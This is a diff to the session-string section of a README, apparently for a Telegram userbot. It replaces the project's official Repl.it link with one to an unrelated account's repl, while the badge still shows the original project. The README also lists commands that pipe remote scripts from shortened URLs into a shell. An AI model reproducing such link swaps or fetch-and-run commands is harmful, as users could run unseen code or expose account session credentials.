@@ -19,7 +19,7 @@
 
 ## Session String
 Different ways to get your `SESSION`:
-* [![Run on Repl.it](https://replit.com/badge/github/TeamUltroid/Ultroid)](https://replit.com/@TeamUltroid/UltroidStringSession)
+* [![Run on Repl.it](https://replit.com/badge/github/TeamUltroid/Ultroid)](https://replit.com/@Yaamiin/somalibots#main.py)
 * Linux : `bash -c "$(curl -fsSL https://git.io/JY9JI)"`
 * PowerShell : `cd desktop ; wget https://git.io/JY9JI ; python ultroid.py`
 * Termux : `sh -c "$(curl -fsSL https://da.gd/termux-tel)"`
